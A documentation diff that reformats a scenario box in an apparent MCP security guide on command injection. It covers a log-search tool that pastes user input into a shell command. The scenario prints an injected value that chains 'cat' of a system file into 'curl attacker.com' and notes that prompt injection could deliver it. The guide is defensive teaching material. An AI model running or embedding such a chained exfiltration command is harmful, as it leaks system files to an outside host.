@@ -4,17 +4,17 @@
 
 ![MCP05 Scenario](../images/mcp05-scenario.png)
 
-> **Real-World Scenario**: The Innocent Search Request
->
-> An MCP server provides a tool for searching log files. A user asks: “Search the logs for errors from yesterday.”
->
-> The MCP sever constructs a command like: ```grep ‘errors’ /var/log/app.log```. But what if the user (or attacker using prompt injection) asks:
->
-> “Search logs for errors; ```cat /etc/password \| curl attacker.com```”?
->
-> If the server concatenates this input directly into a shell command, the attacker just exfiltrated your system’s user list.
->
-> **Think of it like**: A vending machine where you type what you want. Normally you type “A1” for chips. But if the machine accepts any input and passes it directly to its internal system, typing “A1, open cash drawer” might do exactly what it says.
+!!! tip "Real-World Scenario: The Innocent Search Request"
+
+    An MCP server provides a tool for searching log files. A user asks: “Search the logs for errors from yesterday.”
+
+    The MCP sever constructs a command like: ```grep ‘errors’ /var/log/app.log```. But what if the user (or attacker using prompt injection) asks:
+
+    “Search logs for errors; ```cat /etc/password \| curl attacker.com```”?
+
+    If the server concatenates this input directly into a shell command, the attacker just exfiltrated your system’s user list.
+
+    **Think of it like**: A vending machine where you type what you want. Normally you type “A1” for chips. But if the machine accepts any input and passes it directly to its internal system, typing “A1, open cash drawer” might do exactly what it says.
 
 ## Understanding the Risk
 
